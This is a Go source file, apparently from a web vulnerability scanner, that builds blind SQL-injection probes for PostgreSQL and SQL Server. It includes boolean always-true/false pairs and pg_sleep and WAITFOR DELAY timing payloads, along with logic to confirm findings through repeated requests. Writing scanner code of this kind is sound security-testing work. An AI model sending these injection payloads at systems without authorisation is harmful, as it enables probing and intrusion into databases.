package scanner

// The blind-SQLi technique families Burp switches as detection methods for the SQL-injection
// issue type (burpsy-react-ui-saq3.2.1): boolean conditions and time delays.
//
// # What is recovered and what is documented
//
// The probe builders Burp itself uses are burp.Zm4e (boolean) and burp.Zxpy / burp.Zuyg
// (PostgreSQL and SQL Server timing). Their STRUCTURE decompiles cleanly and is transcribed
// below: which context breaks each dialect uses and how the quoted forms are wrapped. The
// boolean condition cores (`1=1` / `1=2`) live inside ZKM string decoders this tree does not
// run, so those literals are the documented standard forms rather than recovered bytes — the
// same convention templateArithmeticPayloads applies to SSTI delimiters. The timing payload
// TEXTS (`pg_sleep(%%)--`, `waitfor delay'0:0:%%'--`) ARE recovered plaintext from Zxpy/Zuyg;
// the context breaks ahead of them are recovered too (Ze2s's ZQ for PostgreSQL, ZM/Zv/Zd for
// SQL Server, ZX/ZO/ZD/ZG for the boolean pairs).
//
// # Which dialects, honestly
//
// Only PostgreSQL and SQL Server timing banks are recoverable in the decompile; Burp's MySQL
// and Oracle timing payloads are not, so burpsy sends none. The selection layer already says
// so: MySQL specific and Oracle specific stay in the declined list with their reason, and a
// run that enables them is told burpsy will not run them rather than quietly pretending.
//
// # How each family is gated
//
// The techniques live INSIDE the one SQL-injection check (blindSQLProbes), and every probe passes
// the harness's method gate (2hze): the error bank under "Error messages", ProbeBoolean under
// "Boolean conditions", and the timing probes under "Time delays" AND their dialect method — a
// PostgreSQL probe is withheld when either PostgreSQL specific or Time delays is disabled, because
// Burp's UI offers both switches over the same request. Nothing here is gated at the descriptor:
// the check declares all five implemented methods (burpsyDetectionMethods), and Burp's own rule
// (Zwy6.java:36-75) keeps it dispatched while ANY declared method is still enabled — withholding
// it whole would also have withheld the error probes an operator left on. The gate's declines are
// counted in the item's methods_declined, which is the same record a descriptor-level withholding
// would have produced, at the granularity of the exact technique instead.

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/burpsy-go/burpsy/internal/bcheck"
)

// sqlBooleanContexts are the prefix/suffix pairs that place a boolean condition in the
// statement around the insertion point, transcribed from burp.Ze2s's ZX/ZO/ZD/ZG pair banks.
//
// A pair's first element is the break that closes whatever the application put around the
// value; the second terminates the rest of the original statement. The same pair carries both
// the always-true and the always-false form, because the classifier needs the two halves to
// differ only in the condition.
var sqlBooleanContexts = [][2]string{
	{"", ""},          // the value sits bare in the statement
	{" and ", "-- "},  // append a condition, comment out the rest
	{")and ", "-- "},  // close one paren the application opened, then append
	{"))and ", "-- "}, // close two
	{"||", "||"},      // string concatenation (PostgreSQL/Oracle quoting)
	{",", ""},         // a further argument: the condition becomes a new expression
}

// sqlQuotedBooleanPairs are the quote-opening pairs for a value that sits inside a string literal
// (burpsy's own, the standard forms): the payload closes the application's quote, adds the
// condition, and leaves the application's own closing quote to finish the last literal. Appended
// to the original value — `seed' and '1'='1` — so the literal before the condition is still the
// value the application expected.
var sqlQuotedBooleanPairs = [][2]string{
	{"' and '1'='1", "' and '1'='2"},
	{"' and 1=1-- ", "' and 1=2-- "},
	{`" and "1"="1`, `" and "1"="2`},
	{"') and ('1'='1", "') and ('1'='2"},
}

// sqlBooleanPayloads renders the always-true / always-false pair for each context.
//
// The condition cores are the documented standard forms; see the file header for why they are
// labelled rather than claimed as recovered. Rendering mirrors Zm4e's composition: prefix
// before the core, suffix after, and a `'` appended when the suffix comments the rest of the
// statement out — a `--` inside a still-open quote would turn the probe into a syntax error
// instead of a condition, and the classifier needs the pair to differ only in the condition.
func sqlBooleanPayloads() [][2]string {
	out := make([][2]string, 0, len(sqlBooleanContexts))
	for _, ctx := range sqlBooleanContexts {
		trueCore := ctx[0] + "1=1" + ctx[1]
		falseCore := ctx[0] + "1=2" + ctx[1]
		if strings.Contains(ctx[1], "--") {
			trueCore += "'"
			falseCore += "'"
		}
		out = append(out, [2]string{trueCore, falseCore})
	}
	return append(out, sqlQuotedBooleanPairs...)
}

// sqlTimingPayload is one dialect's delay probe: the payload text with the delay already
// substituted, and every Burp detection method that gates it.
type sqlTimingPayload struct {
	payload string
	// render spells the probe for a given delay in seconds; render(0) is the zero-delay control a
	// confirmation sends.
	render  func(seconds int) string
	methods []string
}

// sqlTimingPayloads renders the time-based probes for the recoverable dialects.
//
// PostgreSQL (Zxpy): breaks `||`, ` AND `, `,”||` ahead of pg_sleep, the delay in seconds, a
// `--` terminator; the quoted form opens with a `'` the application's own close finishes.
// SQL Server (Zuyg): breaks `" "`, `")"`, `",0)"`, `",0,0)"`, `",0,0,0)"` ahead of
// waitfor delay. The delay is `0:0:S` — Burp's own spelling — because WAITFOR DELAY takes an
// h:m:s literal, not an expression, and a probe that cannot parse cannot sleep.
//
// The break between the application's value and the sleep call is what makes the payload
// injectable rather than a syntax error: `1 pg_sleep(5)` is nothing, `1 AND pg_sleep(5)` is a
// boolean AND, `'1',”||pg_sleep(5)` concatenates a sleeping expression into a string list.
// Burp sends one form per break it recovered for the dialect; the same set is sent here.
func sqlTimingPayloads(delay time.Duration) []sqlTimingPayload {
	seconds := int(delay.Seconds())
	if seconds < 1 {
		seconds = 1
	}
	pgMethods := []string{MethodTimeDelays, MethodPostgreSQLSpecific}
	mssqlMethods := []string{MethodTimeDelays, MethodSQLServerSpecific}
	form := func(prefix, call string, methods []string) sqlTimingPayload {
		render := func(n int) string { return prefix + fmt.Sprintf(call, n) }
		return sqlTimingPayload{payload: render(seconds), render: render, methods: methods}
	}

	var out []sqlTimingPayload
	// PostgreSQL (Zxpy): every recovered break ahead of the sleep call, each with its quoted
	// form — Zxpy builds `break+pg_sleep(%%)--` and `'break+pg_sleep(%%)--` per prefix.
	for _, brk := range []string{"||", " AND ", ",''||"} {
		out = append(out,
			form(brk, "pg_sleep(%d)--", pgMethods),
			form("'"+brk, "pg_sleep(%d)--", pgMethods),
		)
	}
	// SQL Server (Zuyg): every recovered break ahead of waitfor, same two forms per prefix.
	for _, brk := range []string{" ", ")", ",0)", ",0,0)", ",0,0,0)"} {
		out = append(out,
			form(brk, "waitfor delay'0:0:%d'--", mssqlMethods),
			form("'"+brk, "waitfor delay'0:0:%d'--", mssqlMethods),
		)
	}
	return out
}

// blindInjectionPointProbes is the per-point body of the SQL-injection check's blind half: the
// boolean pairs first (cheapest, one request each), then the timing probes — the two dialects'
// recovered forms. The order matters for cost, not for truth: both banks are sent PROGRESSIVELY,
// stopping at the first pair or delay whose evidence confirms — the same rule runInjection applies
// between points ("further payloads cost requests and add nothing to a proven finding"), applied
// inside the point, because the runInjection driver builds a point's whole list before it ever
// looks at the evidence. Without the early stop a timing-vulnerable endpoint is billed one
// 5-second sleep per payload form (16 here), and a boolean-vulnerable one three further pairs
// that ask the same question in a different break style.
//
// The three banks all go through per-technique gates at the probe (error probes inside
// ProbeErrorSignatures, boolean inside ProbeBoolean, timing inside ProbeTimingUnder), so a
// method-disabled family is WITHHELD and counted here, in exactly one shared insertion-point
// walk — one enumeration, one coverage line, one effectiveness prior per point (any of which
// would have been tripled by three separate checks of the same type).
func blindInjectionPointProbes(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint) []InjectionProbe {
	var probes []InjectionProbe
	for _, pair := range sqlBooleanPayloads() {
		if ctx.Err() != nil {
			return probes
		}
		pr := sqlBooleanProbe(ctx, h, p, pair[0], pair[1])
		probes = append(probes, pr)
		if pr.Evidence == InjectionEvidenceBooleanDifferential {
			break // a proven differential; the further break styles ask the same question
		}
	}
	// A baseline already slow relative to the delay makes every timing probe undecidable; one
	// probe says so instead of sixteen requests each waiting to learn it.
	if h.baseline.Duration >= time.Duration(float64(InjectionTimingDelay)*TimingBaselineNoiseCeiling) {
		return append(probes, InjectionProbe{Payload: "time delays", Evidence: InjectionEvidenceInconclusive,
			Detail: fmt.Sprintf("%s %q: the baseline took %s, too close to the %s delay for a delay to be told apart; no timing probe sent",
				p.Kind, p.Name, h.baseline.Duration, InjectionTimingDelay)})
	}
	for _, tp := range sqlTimingPayloads(InjectionTimingDelay) {
		if ctx.Err() != nil {
			return probes
		}
		pr := sqlTimingProbe(ctx, h, p, tp, InjectionTimingDelay)
		probes = append(probes, pr)
		if pr.Evidence == InjectionEvidenceTiming {
			break // the delay is proven; the further break styles ask the same question
		}
	}
	return probes
}

// sqlBooleanProbe sends one always-true / always-false pair appended to the point's value, and
// confirms a differential before reporting it (review of saq3.2.1): one pair can differ by chance
// — a rate limit, a rotating banner, a session that expired between the two requests — so a
// differential stands only when the baseline re-fetches unchanged and the true / false pair
// repeats with the same verdict. That costs three requests, and only on a positive.
//
// Both halves changing the response is a clean answer for SQL injection, not an undecided one: the
// payload was rejected or reflected, not interpreted, and a reflecting parameter would otherwise
// never count as clean for the light-audit tier or the effectiveness prior.
func sqlBooleanProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint, truePayload, falsePayload string) InjectionProbe {
	out := InjectionProbe{Payload: truePayload + " / " + falsePayload}
	if h.withhold(MethodBooleanConditions, 2) {
		return withheldProbe(p, out.Payload, MethodBooleanConditions)
	}
	fingerprint := func(payload string) (ResponseFingerprint, error) {
		resp, err := h.SendAppending(ctx, p, payload)
		if err != nil {
			return ResponseFingerprint{}, err
		}
		return NewResponseFingerprint(resp.Status, resp.Body), nil
	}
	base := NewResponseFingerprint(h.baseline.Status, h.baseline.Body)
	t1, err := fingerprint(truePayload)
	if err == nil {
		var f1 ResponseFingerprint
		if f1, err = fingerprint(falsePayload); err == nil {
			switch ClassifyBooleanDifferential(base, t1, f1) {
			case InjectionEvidenceBooleanDifferential:
				var base2, t2, f2 ResponseFingerprint
				if base2, err = fingerprint(""); err == nil {
					if t2, err = fingerprint(truePayload); err == nil {
						f2, err = fingerprint(falsePayload)
					}
				}
				if err != nil {
					break
				}
				if confirmBooleanDifferential(base, base2, t1, f1, t2, f2) {
					out.Evidence = InjectionEvidenceBooleanDifferential
					out.Detail = fmt.Sprintf("%s %q: always-true kept the response, always-false changed it, twice, against a stable baseline", p.Kind, p.Name)
				} else {
					out.Evidence = InjectionEvidenceNone
					out.Detail = fmt.Sprintf("%s %q: a differential appeared once and did not repeat against a stable baseline", p.Kind, p.Name)
				}
				return out
			case InjectionEvidenceInconclusive:
				out.Evidence = InjectionEvidenceNone
				out.Detail = fmt.Sprintf("%s %q: both halves changed the response, so the condition was not interpreted", p.Kind, p.Name)
				return out
			default:
				out.Evidence = InjectionEvidenceNone
				out.Detail = fmt.Sprintf("%s %q: %s", p.Kind, p.Name, InjectionEvidenceNone)
				return out
			}
		}
	}
	out.Evidence = InjectionEvidenceInconclusive
	out.Detail = fmt.Sprintf("%s %q: boolean probe not completed: %v", p.Kind, p.Name, err)
	return out
}

// confirmBooleanDifferential is the repeat rule: the baseline is stable, both true probes match it,
// both false probes differ from it, and the two false probes agree with each other.
func confirmBooleanDifferential(base, base2, t1, f1, t2, f2 ResponseFingerprint) bool {
	return base.SameShape(base2) && base.SameShape(t1) && base.SameShape(t2) &&
		!base.SameShape(f1) && !base.SameShape(f2) && f1.SameShape(f2)
}

// sqlTimingProbe sends one delay probe appended to the point's value and confirms a delay before
// reporting it (review of saq3.2.1): a single slow response is what a GC pause, a throttle after a
// burst or a tarpit also produces. A delay stands only when the same probe with a zero-second delay
// comes back fast and the delayed probe is slow again — three requests, only on a positive.
func sqlTimingProbe(ctx context.Context, h *ProbeHarness, p bcheck.InsertionPoint, tp sqlTimingPayload, delay time.Duration) InjectionProbe {
	out := InjectionProbe{Payload: tp.payload}
	for _, method := range tp.methods {
		if h.withhold(method, 1) {
			return withheldProbe(p, tp.payload, method)
		}
	}
	seconds := int(delay.Seconds())
	first, err := h.SendAppending(ctx, p, tp.render(seconds))
	if err != nil {
		out.Evidence = InjectionEvidenceInconclusive
		out.Detail = fmt.Sprintf("%s %q: probe not sent: %v", p.Kind, p.Name, err)
		return out
	}
	ev := ClassifyTimingEvidence(h.baseline.Duration, first.Duration, delay)
	if ev != InjectionEvidenceTiming {
		out.Evidence = ev
		out.Detail = fmt.Sprintf("%s %q: baseline %s, injected %s, requested %s: %s", p.Kind, p.Name, h.baseline.Duration, first.Duration, delay, ev)
		return out
	}
	control, cerr := h.SendAppending(ctx, p, tp.render(0))
	second, serr := h.SendAppending(ctx, p, tp.render(seconds))
	if cerr != nil || serr != nil {
		out.Evidence = InjectionEvidenceInconclusive
		out.Detail = fmt.Sprintf("%s %q: one slow response, and its confirmation could not be sent", p.Kind, p.Name)
		return out
	}
	out.Evidence = confirmTiming(h.baseline.Duration, first.Duration, control.Duration, second.Duration, delay)
	out.Detail = fmt.Sprintf("%s %q: baseline %s, delayed %s and %s, zero-delay control %s, requested %s: %s",
		p.Kind, p.Name, h.baseline.Duration, first.Duration, second.Duration, control.Duration, delay, out.Evidence)
	return out
}

// confirmTiming is the repeat rule for a delay: both delayed probes read as the requested delay and
// the zero-delay control does not.
func confirmTiming(baseline, first, control, second, delay time.Duration) InjectionEvidence {
	if ClassifyTimingEvidence(baseline, first, delay) != InjectionEvidenceTiming ||
		ClassifyTimingEvidence(baseline, second, delay) != InjectionEvidenceTiming {
		return InjectionEvidenceNone
	}
	if ClassifyTimingEvidence(baseline, control, delay) != InjectionEvidenceNone {
		// The control was slow too: the endpoint is slow now, whatever the payload says.
		return InjectionEvidenceNone
	}
	return InjectionEvidenceTiming
}
